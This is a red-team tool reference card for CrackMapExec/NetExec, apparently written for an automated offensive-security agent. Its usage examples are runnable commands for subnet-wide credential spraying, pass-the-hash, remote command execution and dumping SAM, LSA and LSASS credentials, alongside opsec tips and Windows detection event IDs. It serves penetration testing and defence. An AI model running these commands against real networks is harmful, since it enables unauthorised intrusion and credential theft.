---
name: CrackMapExec
category: lateral-movement
subcategories: [smb-enumeration, credential-testing, lateral-movement, execution]
tradecraft_tags: [cme, smb, winrm, mssql, lateral-movement, credential-spray, python, swiss-army-knife]
mitre_attack:
  - id: T1021.002
    name: Remote Services — SMB/Windows Admin Shares
  - id: T1078
    name: Valid Accounts
source:
  url: https://github.com/Pennyw0rth/NetExec
  license: BSD-2-Clause
  maintained: true
binary_type: python-script
binary_filename: nxc
supported_os: [linux]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  SMB authentication attempts generate Event 4624/4625 on targets. Lateral movement
  via SMB generates Event 4648 (explicit credentials logon). Mass authentication across
  a subnet is detectable by SIEM correlation. Module execution (e.g. lsassy, mimikatz)
  generates additional events per module. WinRM traffic (port 5985/5986) has distinct patterns.
usage_examples:
  - description: Enumerate domain via SMB with credentials
    args: "nxc smb 192.168.56.0/24 -u jon.snow -p Password123 --shares"
  - description: Pass-the-hash across a subnet
    args: "nxc smb 192.168.56.0/24 -u administrator -H :nthash --local-auth"
  - description: Run a command on all admin-accessible machines
    args: "nxc smb 192.168.56.0/24 -u administrator -p Password123 -x 'whoami'"
  - description: Dump SAM/LSA secrets from accessible machines
    args: "nxc smb 192.168.56.0/24 -u administrator -H :nthash --sam"
  - description: Run lsassy module for LSASS credential harvest
    args: "nxc smb 192.168.56.0/24 -u administrator -H :nthash -M lsassy"
  - description: Enumerate users via RPC
    args: "nxc smb 192.168.56.10 -u jon.snow -p Password123 --users"
  - description: WinRM execution
    args: "nxc winrm 192.168.56.22 -u administrator -p Password123 -x 'whoami'"
opsec_notes: |
  CrackMapExec (now NetExec/nxc) is Python — infrastructure side only. It's very
  loud by default: authentication attempts across a full subnet generate hundreds of
  events. Use targeted single-host queries in sensitive environments. The `--local-auth`
  flag is critical for local accounts; without it, domain auth is attempted. Module
  execution (lsassy, mimikatz) triggers per-module detection signals.
gotchas: |
  CrackMapExec has been forked/rebranded as NetExec (nxc). Both are commonly used;
  the command syntax is largely identical. Python-only — not Apollo-runnable.
  Pass-the-hash requires specifying `--local-auth` for local accounts. WinRM module
  requires WinRM to be enabled on target. The `--sam` flag dumps local SAM but
  requires SMB admin access. Large subnet scans can take significant time.
related_ttps: [impacket-secretsdump, lsassy, ntlmrelayx, impacket-wmiexec]
alternatives: [impacket-suite, metasploit]
common_args:
  smb:
    description: SMB protocol module
    typical_values: [flag-only]
    required: false
  winrm:
    description: WinRM protocol module
    typical_values: [flag-only]
  target:
    description: Target IP, range, or CIDR
    typical_values: ["192.168.56.22", "192.168.56.0/24"]
    required: true
  -u:
    description: Username
    typical_values: ["administrator", "jon.snow"]
    required: true
  -p:
    description: Password
    typical_values: ["Password123"]
  -H:
    description: NTLM hash (LM:NT)
    typical_values: [":nthash"]
  -x:
    description: Command to execute on target
    typical_values: ["whoami", "net user"]
  -M:
    description: Module to run (lsassy, mimikatz, etc.)
    typical_values: ["lsassy", "mimikatz"]
  --sam:
    description: Dump local SAM database
    typical_values: [flag-only]
  --shares:
    description: Enumerate accessible shares
    typical_values: [flag-only]
  --users:
    description: Enumerate domain users via RPC
    typical_values: [flag-only]
  --local-auth:
    description: Authenticate with local account (not domain)
    typical_values: [flag-only]
last_updated: 2026-05-29
---

# CrackMapExec

The "Swiss Army Knife for pentesting networks" (now also maintained as NetExec / nxc).
CrackMapExec provides a unified interface for SMB/WinRM/MSSQL/LDAP operations against
Windows networks — credential testing, remote execution, share enumeration, and module-based
extensions (lsassy, mimikatz, bloodhound, etc.). Infrastructure-side Python tool; most
commonly used from a Linux attack host to enumerate and exploit compromised credentials.

## Typical use cases
- Credential testing across a subnet to find valid accounts
- Pass-the-hash lateral movement survey
- Automated SAM/LSASS credential harvesting via --sam or -M lsassy
- Share enumeration across the network
- Command execution on multiple targets simultaneously

## How Sage uses this
CrackMapExec is infrastructure-side tooling. For Apollo-based lateral movement, Apollo's
native spawn/inject commands or Mythic payload delivery are preferred. CrackMapExec is
the go-to for infrastructure-level credential validation and bulk enumeration before
focusing Apollo agents.

## Apollo-specific note
Python/Linux-only — not Apollo-runnable. Sage documents it for the infrastructure
orchestration pipeline alongside ntlmrelayx and secretsdump.

## Output
Color-coded console output per target: `[+]` (success/admin), `[-]` (auth failure),
`[*]` (connected, no admin). Command output printed inline. Credential dumps
written to `~/.cme/logs/` by default.
